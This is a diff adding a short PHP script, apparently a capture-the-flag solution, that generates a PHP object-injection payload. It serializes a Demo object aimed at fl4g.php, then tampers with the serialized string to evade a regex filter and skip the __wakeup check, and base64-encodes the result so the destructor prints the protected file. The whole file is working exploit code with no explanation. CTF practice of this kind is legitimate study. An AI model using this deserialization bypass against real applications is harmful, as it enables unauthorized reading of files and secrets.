@@ -1,0 +1,28 @@
+<?php 
+class Demo { 
+    private $file = 'index.php';
+    public function __construct($file) { 
+        $this->file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this->file, true); 
+    }
+    function __wakeup() { 
+        if ($this->file != 'index.php') { 
+            //the secret is in the fl4g.php
+            $this->file = 'index.php'; 
+        } 
+    } 
+}
+
+$a=New Demo("fl4g.php");
+$a=serialize($a);
+echo $a;
+$abcd=base64_encode($a);
+echo $abcd;
+$ab=str_replace(":4:",":+4:",$a);
+$abc=str_replace(":1:",":2:",$ab);
+echo $abc;
+$abc=base64_encode($abc);
+echo $abc;
+?>
